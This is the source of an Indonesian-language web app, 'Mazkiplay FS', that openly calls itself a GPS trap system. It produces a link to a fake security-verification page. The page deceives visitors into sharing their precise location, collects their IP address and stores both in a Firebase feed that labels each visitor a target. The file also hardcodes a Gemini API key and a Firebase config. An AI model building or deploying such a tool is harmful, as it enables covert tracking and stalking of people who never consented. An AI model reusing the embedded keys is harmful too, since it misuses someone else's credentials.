<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mazkiplay | Fullstack Command Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-green: #00ff41; --neon-red: #ff0000; }
        body { background-color: #050505; color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }
        .cyber-header { font-family: 'Orbitron', sans-serif; }
        .glass { background: rgba(10, 10, 10, 0.9); border: 1px solid #1a1a1a; box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
        .terminal { background: #000; border-left: 3px solid var(--neon-green); padding: 10px; font-size: 11px; height: 400px; overflow-y: auto; }
        .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; cursor: pointer; }
        .tab-btn.active { border-color: var(--neon-red); color: white; background: rgba(255,0,0,0.1); }
    </style>
</head>
<body class="p-2 md:p-6">

    <div id="app-root" class="max-w-6xl mx-auto">
        <!-- UI: DASHBOARD (ADMIN) -->
        <div id="admin-panel" class="space-y-4">
            <header class="flex flex-col md:flex-row justify-between items-center gap-4 mb-6">
                <div>
                    <h1 class="cyber-header text-3xl font-black text-red-600 tracking-tighter">MAZKIPLAY FS</h1>
                    <p class="text-[10px] text-gray-500 uppercase">Real-Time Intelligence & GPS Trap System</p>
                </div>
                <div class="flex gap-2">
                    <div class="glass px-4 py-2 rounded text-[9px]">DB: <span id="db-status" class="text-yellow-500">CONNECTING...</span></div>
                    <div class="glass px-4 py-2 rounded text-[9px]">TARGETS: <span id="target-count" class="text-red-500">0</span></div>
                </div>
            </header>

            <div class="grid grid-cols-1 lg:grid-cols-4 gap-4">
                <nav class="lg:col-span-1 space-y-2">
                    <button onclick="switchTab('monitor')" id="btn-monitor" class="tab-btn active w-full text-left p-3 glass rounded text-xs">ðŸ“¡ LIVE MONITOR</button>
                    <button onclick="switchTab('gen')" id="btn-gen" class="tab-btn w-full text-left p-3 glass rounded text-xs">ðŸ”— LINK GENERATOR</button>
                    <button onclick="switchTab('ai')" id="btn-ai" class="tab-btn w-full text-left p-3 glass rounded text-xs">ðŸ¤– TACTICAL AI</button>
                    <div class="p-4 mt-4 glass rounded text-[9px] text-gray-600">
                        <p class="font-bold text-gray-400 mb-1 uppercase">Instruksi:</p>
                        1. Bagikan link trap ke target.<br>
                        2. Tunggu target melakukan verifikasi.<br>
                        3. Data akan muncul di monitor.
                    </div>
                </nav>

                <main class="lg:col-span-3 glass rounded-xl p-4 min-h-[500px]">
                    <div id="tab-monitor" class="tab-pane">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Target Feed</h2>
                        <div id="feed-container" class="terminal space-y-4 text-green-500">
                            <div class="text-gray-700 italic">Mencoba menghubungkan ke server...</div>
                        </div>
                    </div>

                    <div id="tab-gen" class="tab-pane hidden">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Deployment</h2>
                        <div class="space-y-4">
                            <div class="p-4 bg-red-900/10 border border-red-900/30 rounded">
                                <label class="text-[10px] text-red-500 font-bold block mb-2">TARGET REDIRECT</label>
                                <input type="text" id="redirect-input" value="https://www.google.com" class="w-full bg-black border border-gray-800 p-2 text-xs outline-none text-white">
                            </div>
                            <div class="p-4 glass rounded">
                                <label class="text-[10px] text-gray-500 block mb-2">TRAP URL:</label>
                                <div class="flex gap-2">
                                    <input type="text" id="trap-url" readonly class="flex-1 bg-transparent text-blue-400 text-xs outline-none">
                                    <button onclick="copyTrapLink()" class="bg-blue-600 text-white px-4 py-1 rounded text-[10px]">COPY</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div id="tab-ai" class="tab-pane hidden flex flex-col h-[450px]">
                        <h2 class="text-white font-bold mb-4 text-xs uppercase tracking-widest">Mazki Intel AI</h2>
                        <div id="ai-chat" class="terminal flex-1 mb-4 text-green-400"></div>
                        <div class="flex gap-2">
                            <input type="text" id="ai-input" placeholder="Tanya AI..." class="flex-1 bg-black border border-gray-800 p-3 text-xs text-white">
                            <button onclick="askAI()" class="bg-green-600 text-black px-6 font-bold text-xs">KIRIM</button>
                        </div>
                    </div>
                </main>
            </div>
        </div>

        <!-- UI: TRAP INTERFACE -->
        <div id="trap-page" class="hidden fixed inset-0 bg-white z-[9999] flex items-center justify-center p-6 text-center">
            <div class="max-w-sm">
                <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                <h1 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi Keamanan</h1>
                <p class="text-gray-600 text-sm mb-6">Selesaikan verifikasi GPS untuk melanjutkan.</p>
                <button id="btn-verify" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg active:scale-95 transition">VERIFIKASI SEKARANG</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        // ==========================================
        // 1. GOOGLE GEMINI API KEY (DIISI OTOMATIS)
        // ==========================================
        const apiKey = "AIzaSyDINRKcVKNFIrxWUoyeSg9R03IYCHGR_DU"; // <--- API KEY DIMASUKKAN DI SINI

        // Global State
        let db, auth, currentUser;
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'mazki-fs-v1';

        // Inisialisasi Firebase
        async function startSystem() {
            try {
                // ==========================================
                // 2. KONFIGURASI FIREBASE ANDA
                // Pastikan nilai-nilai di bawah ini sesuai dengan Firebase Console Anda
                // ==========================================
                let firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
                    apiKey: "AIzaSyC8XeElXIoVdYMCFH16nXnE8q92RvuOOtM",
  authDomain: "mazkiplaycheck.firebaseapp.com",
  projectId: "mazkiplaycheck",
  storageBucket: "mazkiplaycheck.firebasestorage.app",
  messagingSenderId: "662285872996",
  appId: "1:662285872996:web:9249e209bda07e52b95471",
  measurementId: "G-JKVSV73K3E"
                }; // <--- KONFIGURASI FIREBASE ANDA

                if (!firebaseConfig || !firebaseConfig.apiKey) {
                    throw new Error("Konfigurasi Firebase belum lengkap.");
                }

                const app = initializeApp(firebaseConfig);
                db = getFirestore(app);
                auth = getAuth(app);

                onAuthStateChanged(auth, (user) => {
                    if (user) {
                        currentUser = user;
                        updateStatus("ONLINE", "text-green-500 font-bold");
                        
                        const urlParams = new URLSearchParams(window.location.search);
                        if (urlParams.get('view') === 'trap') {
                            showTrapUI();
                        } else {
                            initAdminDashboard();
                        }
                    } else {
                        updateStatus("OFFLINE", "text-gray-500");
                        signIn();
                    }
                });
            } catch (e) {
                console.error("Init Error:", e);
                updateStatus("CONFIG ERROR", "text-red-500 font-bold");
            }
        }

        async function signIn() {
            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (err) {
                console.error("Auth failed:", err);
                updateStatus("AUTH ERROR", "text-red-500 font-bold");
            }
        }

        function updateStatus(text, className) {
            const el = document.getElementById('db-status');
            if (el) {
                el.innerText = text;
                el.className = className;
            }
        }

        window.switchTab = (id) => {
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + id).classList.remove('hidden');
            document.getElementById('btn-' + id).classList.add('active');
        };

        window.copyTrapLink = () => {
            const trapUrl = document.getElementById("trap-url");
            trapUrl.select();
            document.execCommand("copy");
            alert("Link disalin!");
        };

        window.askAI = async () => {
            const input = document.getElementById('ai-input');
            const chat = document.getElementById('ai-chat');
            const prompt = input.value.trim();
            if (!prompt) return;

            chat.innerHTML += `<div class="text-white mb-2">> ${prompt}</div>`;
            input.value = "";

            try {
                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
                });
                const data = await res.json();
                const reply = data.candidates[0].content.parts[0].text;
                chat.innerHTML += `<div class="text-green-400 mb-4">AI: ${reply}</div>`;
            } catch (e) {
                chat.innerHTML += `<div class="text-red-500">AI Error: Periksa koneksi atau API Key.</div>`;
            }
            chat.scrollTop = chat.scrollHeight;
        };

        function initAdminDashboard() {
            const baseUrl = window.location.href.split('?')[0];
            document.getElementById('trap-url').value = `${baseUrl}?view=trap`;

            const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'traps');
            onSnapshot(query(colRef), (snapshot) => {
                const feed = document.getElementById('feed-container');
                const count = document.getElementById('target-count');
                count.innerText = snapshot.docs.length;

                if (snapshot.empty) {
                    feed.innerHTML = `<div class="text-gray-700 italic">Belum ada data target.</div>`;
                    return;
                }

                const sorted = snapshot.docs.map(d => d.data()).sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
                feed.innerHTML = sorted.map(data => `
                    <div class="p-3 border-b border-gray-900 mb-2 glass">
                        <p class="text-red-500 font-bold text-[10px] uppercase">[!] Target Found</p>
                        <p class="text-[10px]">IP: ${data.ip || 'Unknown'}</p>
                        <p class="text-[10px]">Loc: <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-400 underline">Maps</a></p>
                        <p class="text-[8px] text-gray-500">${data.timestamp?.toDate().toLocaleString() || ''}</p>
                    </div>
                `).join('');
            }, (error) => {
                console.error("Snapshot error:", error);
            });
        }

        function showTrapUI() {
            document.getElementById('admin-panel').classList.add('hidden');
            document.getElementById('trap-page').classList.remove('hidden');
            document.body.style.backgroundColor = "white";

            document.getElementById('btn-verify').onclick = () => {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    let ip = "N/A";
                    try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e) {}
                    
                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'traps'), {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        ip: ip,
                        timestamp: serverTimestamp()
                    });
                    window.location.href = document.getElementById('redirect-input').value;
                }, () => alert("Izin GPS wajib diberikan untuk melanjutkan."), { enableHighAccuracy: true });
            };
        }

        startSystem();
    </script>
</body>
</html>
